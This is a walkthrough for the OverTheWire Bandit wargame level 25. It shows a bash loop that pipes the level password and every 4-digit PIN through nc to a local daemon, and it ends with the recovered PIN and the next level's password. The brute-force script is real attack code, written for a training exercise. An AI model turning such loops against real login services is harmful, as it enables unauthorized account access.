# Overthewire - level 25

## Overview

### Category: General skill

### Description:
>A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.
>You do not need to create new connections each time

## Exploitation
Our objective is to make a brute force code using bash to send the current level's password and all 10000 combination of number in the 4-digit format

First, we check what's the ouput of a wrong answer will look like
```bash
bandit24@bandit:~$ echo "$(cat /etc/bandit_pass/bandit24) 9999" | nc localhost 30002
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
Wrong! Please enter the correct current password and pincode. Try again.
```
Then we can get this string to compare and repeat until we have a correct answer

First, we use this *for* loop with four zeros to put our variable in the 4-digit pincode format
```bash
for i in {0000..9999}; do
```
Then we make a variable *response* of the *nc* 
```bash
echo "$i"
response=$(echo "$(cat /etc/bandit_pass/bandit24) "$i"" | nc -q 0 localhost 30002)
```
Then we use *tr* with the flag *-n \r\n* to remove the linedown and then compare the response until it meets the *correct response*
```bash
if [[ "$response" != "I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.Wrong! Please enter the correct current password and pincode. Try again." ]]; then
{
echo "found at "$i""
break;
}
fi
done
```
This is the full command:
```bash
cat << 'EOF' > test1.sh
#!/bin/bash

echo "testing"
for i in {0000..9999}; do
echo "$i"
response=$(echo "$(cat /etc/bandit_pass/bandit24) "$i"" | nc -q 0 localhost 30002)
response=$(echo "$response" | tr -d '\r\n')
if [[ "$response" != "I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.Wrong! Please enter the correct current password and pincode. Try again." ]]; then
{
echo "found at "$i""
break;
}
fi
done
echo "done testing"
EOF
```
Then we run it for a while and find out that the 4-digit pincode is 0332
```bash
bandit24@bandit:/tmp/tmp.wTVYOPtf9b$ chmod 777 test1.sh
bandit24@bandit:/tmp/tmp.wTVYOPtf9b$ ./test1.sh
```
then we run the *nc* again with the correct pincode to get the password
```bash
bandit24@bandit:/tmp/tmp.wTVYOPtf9b$ echo "$(cat /etc/bandit_pass/bandit24) 0332" | nc -q 0 localhost 30002
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
Correct!
The password of user bandit25 is 
```
### Password
SoHfqMOEqIX2IYKVciZxvgpR9a2Djx4P